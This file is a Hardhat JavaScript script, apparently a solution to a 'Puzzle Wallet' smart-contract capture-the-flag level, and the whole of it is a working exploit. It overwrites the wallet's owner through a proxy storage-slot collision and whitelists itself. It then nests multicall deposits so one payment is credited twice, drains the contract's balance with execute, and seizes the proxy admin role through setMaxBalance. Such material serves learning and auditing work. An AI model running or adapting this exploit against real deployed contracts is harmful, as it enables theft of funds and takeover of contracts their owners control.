const {ethers} = require("hardhat");
require('dotenv').config()

async function main() {
  const user = new ethers.Wallet(process.env.PRIVATE_KEY, ethers.provider);
  const PuzzleWallet = await ethers.getContractFactory("PuzzleWallet");
  const PuzzleProxy = await ethers.getContractFactory("PuzzleProxy");
  const puzzleProxy = await PuzzleProxy.attach(process.env.PUZZLE_WALLET_ADDR);
  const puzzleWallet = await PuzzleWallet.attach(process.env.PUZZLE_WALLET_ADDR);

  console.log(`contract balance: ${await ethers.provider.getBalance(process.env.PUZZLE_WALLET_ADDR)}`);
  let tx = await puzzleProxy.proposeNewAdmin(user.address);
  await tx.wait();
  console.log(`owner: ${await puzzleWallet.owner()}`);
  console.log(`maxBalance: ${(await puzzleWallet.maxBalance()).toHexString()}`);
  tx = await puzzleWallet.connect(user).addToWhitelist(user.address);
  tx = await puzzleWallet.connect(user).addToWhitelist(puzzleWallet.address);
  tx = await puzzleWallet.connect(user).deposit({
    value: ethers.utils.parseEther('0.001'),
  });
  await tx.wait();
  console.log(`user balance: ${(await puzzleWallet.balances(user.address))}`);
  console.log(`contract balance: ${await ethers.provider.getBalance(process.env.PUZZLE_WALLET_ADDR)}`);
  const depositCalldata = puzzleWallet.interface.encodeFunctionData('deposit', []);
  const multicallDepositCalldata = puzzleWallet.interface.encodeFunctionData('multicall', [[depositCalldata]]);
  tx = await puzzleWallet.connect(user).multicall(
    [
      multicallDepositCalldata,
      multicallDepositCalldata,
    ],
    {
      value: ethers.utils.parseEther('0.001'),
    }
  );
  await tx.wait();
  console.log(`user balance: ${(await puzzleWallet.balances(user.address))}`);
  console.log(`contract balance: ${await ethers.provider.getBalance(process.env.PUZZLE_WALLET_ADDR)}`);
  // make balance of wallet 0
  tx = await puzzleWallet.connect(user).execute(user.address, await puzzleWallet.balances(user.address), "0x");
  await tx.wait();
  tx = await puzzleWallet.connect(user).setMaxBalance(user.address);
  await tx.wait();
  console.log(`admin: ${await puzzleProxy.admin()}`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
